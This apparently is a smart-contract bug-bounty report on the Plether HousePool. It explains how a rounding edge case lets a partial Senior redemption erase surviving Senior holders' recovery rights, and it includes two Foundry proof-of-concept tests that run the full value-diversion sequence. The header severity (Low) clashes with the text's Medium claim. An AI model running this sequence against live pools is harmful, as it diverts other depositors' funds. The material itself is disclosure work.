# \#99796 [SC-Low] Dust-principal redemption erases the recovery rights of surviving Senior shares

**Submitted on Nov 15th 2026 at 09:50:05 UTC by @jsmaxi for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99796
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

When an impaired Senior tranche has only one settlement-token atom of principal left, ERC-4626 virtual-offset rounding can let fewer than all Senior shares redeem that entire atom. `HousePool` then scales the Senior high-water mark by the funded-asset ratio, treats 100% of principal as withdrawn, and erases 100% of the recovery mark even though other Senior shares survive. Later recognized pool value can consequently be allocated to Junior before restoring the surviving Senior holders' recovery entitlement.

The earlier asset-ratio fix described full principal funding as clearing the mark. That rule assumes all recovery-bearing shares have exited, which fails when virtual-offset rounding lets a subset take the remaining principal.

## Vulnerability Details

Senior withdrawal settlement freezes principal `P` and share supply `S`, prices shares with one virtual asset atom and 1,000 virtual shares, and reduces the Senior high-water mark `H` using the actual funded assets `A`:

```text
A  = floor(F * (P + 1) / (S + 1000))
P' = P - A
H' = H - floor(H * A / P)
```

This normally preserves the same economic fraction of principal and recovery protection. It fails at the dust boundary. If `P = 1` and a holder redeems approximately half of `S`, the virtual asset makes the quote:

```text
A = floor(F * 2 / (S + 1000)) = 1
```

Thus a strict subset `F < S` can receive all principal. `scaleSeniorOnWithdraw` then evaluates `floor(H * 1 / 1) = H`, making `H' = 0`, even though `S - F` shares remain outstanding. The permanent seed floor guarantees that the redeemer cannot own and burn every Senior share.

The same rounding can affect a larger dust principal `P` when a zero-fee subset redemption holds at least `ceil(P * (S + 1000) / (P + 1))` shares and pool cash can fund the payout. Zero fee is the ordinary live-oracle settlement setting; the configured 25-bps Senior exit fee applies only while the oracle is frozen. A positive exit fee prevents the net payout from equaling all of `P`. The runnable tests use `P = 1`.

This state is externally actionable. A holder may request its entire wallet balance even when its quote is below the ordinary minimum withdrawal size. Once the request matures and withdrawals are live, settlement transfers the one atom, burns only the requested shares, and commits the zero high-water mark.

The recovery mark is economically attached to the outstanding Senior ownership, not merely to the last atom of current principal. Losses intentionally leave `H` unchanged so future revenue restores impaired Senior holders; the protocol's full-wipe regression also checks that the mark survives while Senior shares remain. Before the MED-11 remediation, the share-ratio calculation would have retained the surviving shares' pro-rata mark in this exact case. The asset-ratio remediation correctly protects retained exit fees in normal states, but assumes that funding all principal implies burning all economically entitled shares. ERC-4626 virtual-offset rounding breaks that assumption.

After the redemption, `P = H = 0` even though ordinary Senior LP shares survive. The next surplus recognized through `accountExcess` is therefore assigned directly to Junior instead of restoring those shares. No recapitalization or zero-principal high-water-mark bootstrap is needed. A participant who holds Junior and the redeeming Senior balance can sacrifice its own Senior recovery rights while also destroying another Senior LP's rights, then receive part of the diverted value through Junior.

The acknowledged LOW-54 behavior is the opposite error: repeated rounding can preserve less than one extra settlement-token atom of protection per pass. This issue removes a material recovery entitlement in one pass. MED-11 states that full principal funding clears `H`, but does not account for full principal funding by fewer than all shares. It is therefore an incomplete-fix edge case rather than the accepted conservative dust behavior.

MED-29 concerns a controller receiving zero funded shares in a partially funded, refundable epoch. Here the Senior redemption is fully funded and claimed. HousePool then clears the recovery mark owed to other Senior holders whose shares remain outstanding.

This mark reduction happens within one Senior withdrawal, with no pending recapitalization. Repeated partial-recapitalization reconciliation changes the mark through a separate accounting path.

## Impact Details

Surviving Senior holders permanently lose their priority over future pool value. The erased amount can be allocated to Junior and redeemed through the normal epoch flow. The PoC uses the actual 1-USDG release seed and an independent Carol deposit of 999 USDG. Carol never redeems, and her pro-rata recovery right before the bug is greater than 500 USDG. After Bob's subset redemption clears the mark, the owner recognizes 500 USDG through `accountExcess`; Senior receives zero, Junior receives all 500 USDG, and Bob withdraws more than 300 USDG after a later Junior redemption epoch matures. The surplus is transferred and recognized by the owner in the test; it is not trading-generated revenue.

A separate passing test proves the same diversion with trading recovery and no added pool tokens. It keeps a SHORT opened at the 2.00 price cap, where its maximum payout liability is zero, while the Senior principal falls to one atom. Router settlement funds that atom for fewer than all Senior shares. A later signed mark move to 1.00 and normal Router close realize more than 500 USDG of trader loss into the pool; Junior receives the recovery and its holder withdraws more than 300 USDG while the surviving Senior shares' pro-rata mark exceeds the recovered value. This test uses the repository's 1,000-USDG seed fixture; the first PoC independently proves the dust transition with the release's 1-USDG seeds and an ordinary surviving Senior LP.

The attacker need not control an owner role, although the documented owner call to clear degraded mode is required after the severe loss. The tests use two equal-weight mocked feeds, while the release basket has six weighted FX feeds. Their large synthetic price moves and exact one-atom endpoint constrain practical feasibility. Medium is conservative and matches the prior MED-11 classification for material Senior-to-Junior recovery diversion.

## References

- [Senior settlement and high-water-mark scaling](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L823-L865)
- [Live and frozen LP exit fees](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1147-L1155)
- [ERC-4626 virtual-offset redemption pricing](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolRedemptionMathLib.sol#L20-L47)
- [Asset-ratio high-water-mark reduction](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L112-L131)
- [Full-wallet minimum-size exception](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L631)
- [Minimum-size predicate and permanent seed floor](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1611-L1636)
- [Senior recovery rule](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L340)
- [Full-wipe recovery regression](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/TrancheRecoveryBehavior.t.sol#L65-L77)
- [MED-11 fix](https://github.com/Plether-Fi/plether-core/commit/9ab65f4175cb90805eabb434908ab4832a124d56) and [LOW-54 accepted residual](https://github.com/Plether-Fi/plether-core/commit/9a16ef4f184d3c23c241906a45daff66be0450b9)
- [Prior audit MED-29, tiny-share allocation in a refundable epoch](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf)

## Proof of Concept

## Proof of Concept

The test `test_ReleaseSeedsAndOrdinarySeniorSurvivorLoseRecoveryRight` in `SeniorDustReleaseSeedNoRecap.t.sol` executes the complete lifecycle at the pinned commit:

1. It uses the actual 1-USDG release seeds, adds Carol as an ordinary 999-USDG Senior LP, enables the release 80% Senior cap and 10/20-bps margins, and asserts that the 25-bps settlement buffer remains enabled.
2. Ordinary Router orders, an ordinary Junior redemption, and Pyth-backed closes leave exactly one USDG atom of pool cash, `(Senior, Junior) = (1, 0)`, and no trader claims.
3. The documented owner recovery call clears degraded mode after both positions close.
4. Bob also owns the Junior shares. His full Senior wallet quotes at the final atom and settles in full, leaving both the release seed and Carol's ordinary Senior shares alive while `seniorHighWaterMark` becomes zero.
5. Without any recapitalization, 500 USDG of owner-recognized surplus is allocated entirely to Junior even though Carol's erased recovery right alone exceeds that amount.
6. After the Junior redemption epoch matures, Bob claims more than 300 USDG through the bounded settlement path.

The additional test `test_SubsetSeniorExitRedirectsOrdinaryTradingRecoveryToJunior` in `SeniorDustOrganicTradingRevenue.t.sol` leaves a zero-maximum-payout SHORT open, uses Router Pyth settlement for the one-atom Senior redemption, then realizes a trader loss through a genuine close and demonstrates Junior withdrawal. It uses no recapitalization, owner-admitted excess, or direct pool funding.

The complete patch below adds both tests. Save it as `senior-dust.patch` at the repository root of the pinned commit. From that root, apply it and run the targeted tests:

```diff
diff --git a/packages/perps/test/perps/accounting/waterfall/SeniorDustReleaseSeedNoRecap.t.sol b/packages/perps/test/perps/accounting/waterfall/SeniorDustReleaseSeedNoRecap.t.sol
new file mode 100644
index 00000000..9144fdab
--- /dev/null
+++ b/packages/perps/test/perps/accounting/waterfall/SeniorDustReleaseSeedNoRecap.t.sol
@@ -0,0 +1,175 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.35;
+
+import {BasePerpTest} from "../../BasePerpTest.sol";
+import {CfdTypes} from "@plether/perps/CfdTypes.sol";
+import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
+import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
+
+contract SeniorDustReleaseSeedNoRecapTest is BasePerpTest {
+
+    uint256 private constant ENTRY_PRICE = 100_000_000;
+    uint256 private constant FIRST_SIZE = 400_000e18;
+    uint256 private constant SECOND_SIZE = 200_000e18;
+    uint256 private constant TOTAL_SIZE = FIRST_SIZE + SECOND_SIZE;
+    address private constant alice = address(0x111);
+    address private constant bob = address(0x222);
+    address private constant carol = address(0x333);
+
+    function _initialJuniorDeposit() internal pure override returns (uint256) {
+        return 0;
+    }
+
+    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
+        return 1e6;
+    }
+
+    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
+        return 1e6;
+    }
+
+    function setUp() public override {
+        super.setUp();
+        assertEq(pool.seniorPrincipal(), 1e6, "release Senior seed");
+        assertEq(pool.juniorPrincipal(), 1e6, "release Junior seed");
+        _fundJunior(bob, 1_000_999e6);
+    }
+
+    function test_ReleaseSeedsAndOrdinarySeniorSurvivorLoseRecoveryRight() public {
+        vm.warp(juniorVault.lastDepositTime(bob) + juniorVault.DEPOSIT_COOLDOWN() + 1);
+        _setSeniorCapacity(40_000_000e6, 8000);
+        CfdTypes.RiskParams memory releaseRisk = _riskParams();
+        releaseRisk.vpiFactor = 0.01e18;
+        releaseRisk.maintMarginBps = 10;
+        releaseRisk.initMarginBps = 20;
+        _setRiskParams(releaseRisk);
+        assertEq(engine.settlementBufferBps(), 25, "launch settlement buffer must remain enabled");
+        _refreshMark(ENTRY_PRICE);
+
+        // This amount makes the post-trade terminal NAV exactly one USDG atom while
+        // giving the redeemer a strict majority, but not all, of the Senior shares.
+        // The release seed is only 1 USDG. Carol supplies ordinary Senior
+        // liquidity and never redeems, so surviving rights are not a seed-only artifact.
+        _fundSenior(carol, 999e6);
+        _fundSenior(bob, 1001e6 - 625 + 492_825);
+        _refreshMark(ENTRY_PRICE);
+        uint256 originalHwm = pool.seniorHighWaterMark();
+        uint256 supplyBefore = seniorVault.totalSupply();
+        uint256 redeemerShares = seniorVault.balanceOf(bob);
+        uint256 victimShares = seniorVault.balanceOf(carol);
+        uint256 shareProRataRemainingHwm = originalHwm - (originalHwm * redeemerShares) / supplyBefore;
+        assertLt(redeemerShares, supplyBefore, "the permanent seed must retain Senior shares");
+        assertGt(victimShares, 0, "an ordinary Senior LP must survive");
+        assertGt(originalHwm * victimShares / supplyBefore, 500e6, "the other LP's recovery right is material");
+        assertGt(shareProRataRemainingHwm, 500e6, "the surviving recovery entitlement is material");
+
+        // Two balanced sides are admitted under the launch skew limit. A normal Junior
+        // redemption then reduces pool cash before the two genuine market wins are closed.
+        _fundTrader(alice, 100_000e6);
+        _fundTrader(bob, 100_000e6);
+        _order(alice, CfdTypes.Side.LONG, FIRST_SIZE, 25_000e6, ENTRY_PRICE, false);
+        _order(bob, CfdTypes.Side.SHORT, FIRST_SIZE, 25_000e6, ENTRY_PRICE, false);
+        _order(alice, CfdTypes.Side.LONG, SECOND_SIZE, 12_500e6, ENTRY_PRICE, false);
+        _order(bob, CfdTypes.Side.SHORT, SECOND_SIZE, 12_500e6, ENTRY_PRICE, false);
+
+        uint256 juniorExitShares = juniorVault.estimateWithdrawShares(350_000e6);
+        vm.prank(bob);
+        uint256 juniorExitEpoch = juniorVault.requestRedeem(juniorExitShares, bob, bob);
+        vm.warp(pool.lpEpochStart(juniorExitEpoch));
+        _refreshMark(ENTRY_PRICE);
+        router.settleLpEpoch(_pythUpdateData());
+        uint256 juniorExitClaimable = juniorVault.claimableRedeemRequest(juniorExitEpoch, bob);
+        vm.prank(bob);
+        juniorVault.claimRedeem(juniorExitEpoch, juniorExitClaimable, bob, bob);
+
+        _order(alice, CfdTypes.Side.LONG, TOTAL_SIZE, 0, 40_000_000, true);
+        _order(bob, CfdTypes.Side.SHORT, TOTAL_SIZE, 0, 149_089_860, true);
+
+        assertEq(pool.totalAssets() - engine.totalTraderClaimBalanceAssets(), 1, "net claimant cash must be one atom");
+        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "the trigger must not rely on an unpaid trader claim");
+        (uint256 projectedSenior, uint256 projectedJunior,,) = pool.getPendingTrancheState();
+        assertEq(projectedSenior, 1, "ordinary trading must leave one Senior principal atom");
+        assertEq(projectedJunior, 0);
+        assertTrue(engine.degradedMode(), "the severe loss should latch degraded mode");
+        engine.clearDegradedMode();
+
+        // The 1-asset/1,000-share virtual offsets let a strict subset of supply quote
+        // all remaining principal. A full-wallet request bypasses the minimum size.
+        assertEq(seniorVault.estimateRedeemAssets(redeemerShares), 1);
+        assertEq(seniorVault.maxRequestRedeem(bob), redeemerShares);
+        vm.prank(bob);
+        uint256 seniorExitEpoch = seniorVault.requestRedeem(redeemerShares, bob, bob);
+        vm.warp(pool.lpEpochStart(seniorExitEpoch));
+        _refreshMark(ENTRY_PRICE);
+        IHousePool.LpEpochSettlementResult memory result = pool.settleLpEpoch(0, 0);
+        assertEq(result.seniorFundedShares, redeemerShares);
+        assertEq(result.seniorFundedAssets, 1);
+        assertGt(seniorVault.totalSupply(), 0, "the permanent seed Senior shares must survive");
+        assertGt(seniorVault.balanceOf(carol), 0, "the ordinary Senior LP shares must survive");
+        assertEq(pool.seniorPrincipal(), 0);
+        assertEq(pool.seniorHighWaterMark(), 0, "the asset-ratio scaling erases every survivor's recovery right");
+
+        // Admit external value as ordinary pool assets. No recapitalization or
+        // zero-principal HWM bootstrap occurs after the dust redemption.
+        uint256 newlyAdmitted = 500e6;
+        settlementToken.mint(address(pool), newlyAdmitted);
+        pool.accountExcess();
+        assertEq(pool.pendingRecapitalizationAssets(), 0);
+        assertEq(pool.seniorHighWaterMark(), 0);
+        (uint256 pendingSenior, uint256 pendingJunior,,) = pool.getPendingTrancheState();
+        assertEq(pendingSenior, 0, "Surviving Senior shares receive none of the admitted value");
+        assertEq(pendingJunior, newlyAdmitted, "Junior receives all admitted value");
+        assertGt(shareProRataRemainingHwm, newlyAdmitted, "A share-pro-rata HWM would restore Senior first");
+
+        uint256 juniorShares = juniorVault.maxRequestRedeem(bob);
+        assertGt(juniorShares, 0);
+        vm.prank(bob);
+        uint256 revenueEpoch = juniorVault.requestRedeem(juniorShares, bob, bob);
+        vm.warp(pool.lpEpochStart(revenueEpoch));
+        _refreshMark(ENTRY_PRICE);
+        IHousePool.LpEpochSettlementResult memory revenueResult = pool.settleLpEpoch(0, 0);
+        assertEq(pool.seniorPrincipal(), 0);
+        assertGt(revenueResult.juniorFundedAssets, 300e6, "Junior receives the admitted value");
+        uint256 fundedJuniorShares = juniorVault.claimableRedeemRequest(revenueEpoch, bob);
+        vm.prank(bob);
+        assertGt(juniorVault.claimRedeem(revenueEpoch, fundedJuniorShares, bob, bob), 300e6);
+    }
+
+    function _order(
+        address account,
+        CfdTypes.Side side,
+        uint256 size,
+        uint256 margin,
+        uint256 price,
+        bool close
+    ) private {
+        vm.prank(account);
+        uint64 orderId = router.commitOrder(side, size, margin, close ? 0 : ENTRY_PRICE, close);
+        vm.warp(vm.getBlockTimestamp() + 6);
+        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
+        vm.roll(vm.getBlockNumber() + 1);
+        OrderV3Types.ExecutionResult memory orderResult = router.executeOrder(orderId, _pythUpdateData());
+        assertEq(uint8(orderResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
+    }
+
+    function _refreshMark(
+        uint256 price
+    ) private {
+        uint256 nextTime = vm.getBlockTimestamp();
+        for (uint256 i; i < 72 && (engine.isOracleFrozen() || engine.isFadWindow()); ++i) {
+            nextTime += 1 hours;
+            vm.warp(nextTime);
+        }
+        assertFalse(engine.isOracleFrozen());
+        assertFalse(engine.isFadWindow());
+        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
+        vm.roll(vm.getBlockNumber() + 1);
+        router.updateMarkPrice(_pythUpdateData());
+    }
+
+    function _pythUpdateData() private pure returns (bytes[] memory updateData) {
+        updateData = new bytes[](1);
+        updateData[0] = "";
+    }
+
+}
diff --git a/packages/perps/test/perps/accounting/waterfall/SeniorDustOrganicTradingRevenue.t.sol b/packages/perps/test/perps/accounting/waterfall/SeniorDustOrganicTradingRevenue.t.sol
new file mode 100644
index 00000000..ba4ea0dc
--- /dev/null
+++ b/packages/perps/test/perps/accounting/waterfall/SeniorDustOrganicTradingRevenue.t.sol
@@ -0,0 +1,155 @@
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity 0.8.35;
+
+import {OrderRouterPythTestBase} from "../../shared/OrderRouterTestBase.sol";
+import {CfdTypes} from "@plether/perps/CfdTypes.sol";
+import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
+import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
+
+contract SeniorDustOrganicTradingRevenueTest is OrderRouterPythTestBase {
+
+    uint256 private constant ENTRY_PRICE = 100_000_000;
+    uint256 private constant FIRST_SIZE = 400_000e18;
+    uint256 private constant SECOND_SIZE = 200_000e18;
+    uint256 private constant TOTAL_SIZE = FIRST_SIZE + SECOND_SIZE;
+
+    function test_SubsetSeniorExitRedirectsOrdinaryTradingRecoveryToJunior() public {
+        vm.warp(juniorVault.lastDepositTime(bob) + juniorVault.DEPOSIT_COOLDOWN() + 1);
+        _setSeniorCapacity(40_000_000e6, 8000);
+        CfdTypes.RiskParams memory releaseRisk = _riskParams();
+        releaseRisk.vpiFactor = 0.01e18;
+        releaseRisk.maintMarginBps = 10;
+        releaseRisk.initMarginBps = 20;
+        _setRiskParams(releaseRisk);
+        assertEq(engine.settlementBufferBps(), 25, "launch settlement buffer must remain enabled");
+        _refreshMark(ENTRY_PRICE);
+
+        // This amount makes the post-trade terminal NAV exactly one USDG atom while
+        // giving the redeemer a strict majority, but not all, of the Senior shares.
+        _fundSenior(bob, 1001e6 - 625 + 492_820);
+        _refreshMark(ENTRY_PRICE);
+        uint256 originalHwm = pool.seniorHighWaterMark();
+        uint256 supplyBefore = seniorVault.totalSupply();
+        uint256 redeemerShares = seniorVault.balanceOf(bob);
+        uint256 shareProRataRemainingHwm = originalHwm - (originalHwm * redeemerShares) / supplyBefore;
+        assertLt(redeemerShares, supplyBefore, "the permanent seed must retain Senior shares");
+        assertGt(shareProRataRemainingHwm, 500e6, "the surviving recovery entitlement is material");
+
+        // Charlie's cap-entry SHORT has zero maximum payout liability but can incur a
+        // later trading loss. Balanced large positions satisfy the launch skew limit.
+        _fundTrader(alice, 100_000e6);
+        _fundTrader(bob, 100_000e6);
+        address charlie = address(0x333);
+        _fundTrader(charlie, 10_000e6);
+        vm.deal(charlie, 10 ether);
+        vm.warp(vm.getBlockTimestamp() + 6);
+        _refreshMark(200_000_000);
+        _order(charlie, CfdTypes.Side.SHORT, 600e18, 1000e6, 200_000_000, false);
+        vm.warp(vm.getBlockTimestamp() + 6);
+        _refreshMark(ENTRY_PRICE);
+        _order(alice, CfdTypes.Side.LONG, FIRST_SIZE, 25_000e6, ENTRY_PRICE, false);
+        _order(bob, CfdTypes.Side.SHORT, FIRST_SIZE, 25_000e6, ENTRY_PRICE, false);
+        _order(alice, CfdTypes.Side.LONG, SECOND_SIZE, 12_500e6, ENTRY_PRICE, false);
+        _order(bob, CfdTypes.Side.SHORT, SECOND_SIZE, 12_500e6, ENTRY_PRICE, false);
+
+        uint256 juniorExitShares = juniorVault.estimateWithdrawShares(44_395_548_742);
+        vm.prank(bob);
+        uint256 juniorExitEpoch = juniorVault.requestRedeem(juniorExitShares, bob, bob);
+        vm.warp(pool.lpEpochStart(juniorExitEpoch));
+        _refreshMark(ENTRY_PRICE);
+        router.settleLpEpoch(_pythUpdateData());
+        uint256 juniorExitClaimable = juniorVault.claimableRedeemRequest(juniorExitEpoch, bob);
+        vm.prank(bob);
+        juniorVault.claimRedeem(juniorExitEpoch, juniorExitClaimable, bob, bob);
+
+        _order(alice, CfdTypes.Side.LONG, TOTAL_SIZE, 0, 40_000_000, true);
+        _order(bob, CfdTypes.Side.SHORT, TOTAL_SIZE, 0, 200_000_000, true);
+
+        (uint256 projectedSenior, uint256 projectedJunior,,) = pool.getPendingTrancheState();
+        (uint256 shortMaxProfit,,,) = engine.sides(1);
+        assertEq(shortMaxProfit, 0, "the surviving short has no maximum payout liability");
+        assertEq(projectedSenior, 1, "ordinary trading must leave one Senior principal atom");
+        assertEq(projectedJunior, 0);
+        assertEq(pool.getFreeAssets(), 1, "the Senior atom must be withdrawable with an open position");
+        assertEq(pool.totalAssets() - engine.totalTraderClaimBalanceAssets(), 1, "net claimant cash must be one atom");
+        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "the trigger must not rely on an unpaid trader claim");
+        assertTrue(engine.degradedMode(), "the severe loss should latch degraded mode");
+        engine.clearDegradedMode();
+
+        // The 1-asset/1,000-share virtual offsets let a strict subset of supply quote
+        // all remaining principal. A full-wallet request bypasses the minimum size.
+        assertEq(seniorVault.estimateRedeemAssets(redeemerShares), 1);
+        assertEq(seniorVault.maxRequestRedeem(bob), redeemerShares);
+        vm.prank(bob);
+        uint256 seniorExitEpoch = seniorVault.requestRedeem(redeemerShares, bob, bob);
+        vm.warp(pool.lpEpochStart(seniorExitEpoch));
+        _refreshMark(200_000_000);
+        router.settleLpEpoch(_pythUpdateData());
+        uint256 fundedSeniorShares = seniorVault.claimableRedeemRequest(seniorExitEpoch, bob);
+        assertEq(fundedSeniorShares, redeemerShares);
+        vm.prank(bob);
+        assertEq(seniorVault.claimRedeem(seniorExitEpoch, fundedSeniorShares, bob, bob), 1);
+        assertGt(seniorVault.totalSupply(), 0, "the permanent seed Senior shares must survive");
+        assertEq(pool.seniorPrincipal(), 0);
+        assertEq(pool.seniorHighWaterMark(), 0, "the asset-ratio scaling erases every survivor's recovery right");
+
+        // A genuine price move turns Charlie's preexisting SHORT from break-even
+        // into a loss. The released value should recover the surviving Senior HWM.
+        vm.warp(vm.getBlockTimestamp() + 6);
+        _refreshMark(ENTRY_PRICE);
+        (uint256 pendingSenior, uint256 pendingJunior,,) = pool.getPendingTrancheState();
+        assertEq(pendingSenior, 0, "the erased Senior mark cannot receive recovery revenue");
+        assertGt(pendingJunior, 500e6, "ordinary price movement allocates material value to Junior");
+        assertLt(pendingJunior, shareProRataRemainingHwm, "all recovered value falls within the surviving Senior HWM");
+        _order(charlie, CfdTypes.Side.SHORT, 600e18, 0, ENTRY_PRICE, true);
+        (pendingSenior, pendingJunior,,) = pool.getPendingTrancheState();
+        assertEq(pendingSenior, 0);
+        assertGt(pendingJunior, 500e6);
+        assertGt(pool.totalAssets(), 500e6, "the trader close realizes physical pool cash");
+
+        uint256 juniorShares = juniorVault.maxRequestRedeem(bob);
+        vm.prank(bob);
+        uint256 revenueEpoch = juniorVault.requestRedeem(juniorShares, bob, bob);
+        vm.warp(pool.lpEpochStart(revenueEpoch));
+        _refreshMark(ENTRY_PRICE);
+        IHousePool.LpEpochSettlementResult memory revenueResult = pool.settleLpEpoch(0, 0);
+        assertEq(pool.seniorPrincipal(), 0, "Senior receives none of the trading recovery");
+        assertGt(revenueResult.juniorFundedAssets, 300e6, "the Junior owner can extract material value");
+        uint256 fundedJuniorShares = juniorVault.claimableRedeemRequest(revenueEpoch, bob);
+        vm.prank(bob);
+        assertGt(juniorVault.claimRedeem(revenueEpoch, fundedJuniorShares, bob, bob), 300e6);
+    }
+
+    function _order(
+        address account,
+        CfdTypes.Side side,
+        uint256 size,
+        uint256 margin,
+        uint256 price,
+        bool close
+    ) private {
+        vm.prank(account);
+        uint64 orderId = router.commitOrder(side, size, margin, close ? 0 : price, close);
+        vm.warp(vm.getBlockTimestamp() + 6);
+        mockPyth.setAllPrices(feedIds, int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
+        vm.roll(vm.getBlockNumber() + 1);
+        OrderV3Types.ExecutionResult memory orderResult = router.executeOrder(orderId, _pythUpdateData());
+        assertEq(uint8(orderResult.status), uint8(OrderV3Types.LifecycleStatus.Executed));
+    }
+
+    function _refreshMark(
+        uint256 price
+    ) private {
+        uint256 nextTime = vm.getBlockTimestamp();
+        for (uint256 i; i < 72 && (engine.isOracleFrozen() || engine.isFadWindow()); ++i) {
+            nextTime += 1 hours;
+            vm.warp(nextTime);
+        }
+        assertFalse(engine.isOracleFrozen());
+        assertFalse(engine.isFadWindow());
+        mockPyth.setAllPrices(feedIds, int64(uint64(price)), int32(-8), vm.getBlockTimestamp());
+        vm.roll(vm.getBlockNumber() + 1);
+        router.updateMarkPrice(_pythUpdateData());
+    }
+
+}
```

```sh
git submodule update --init --recursive
git apply --check senior-dust.patch
git apply senior-dust.patch
forge test --root packages/perps --match-path test/perps/accounting/waterfall/SeniorDustReleaseSeedNoRecap.t.sol --match-test test_ReleaseSeedsAndOrdinarySeniorSurvivorLoseRecoveryRight -vv
forge test --root packages/perps --match-path test/perps/accounting/waterfall/SeniorDustOrganicTradingRevenue.t.sol --match-test test_SubsetSeniorExitRedirectsOrdinaryTradingRecoveryToJunior -vv
```

Both targeted tests passed independently.

## Recommended Remediation

Do not infer that all Senior recovery rights have been withdrawn solely because `fundedAssets == seniorPrincipal`. Define the withdrawal scaling rule so surviving shares retain their share of the recovery mark while preserving the existing protection for retained exit fees. Add a regression case for a subset redemption at `P = 1`.

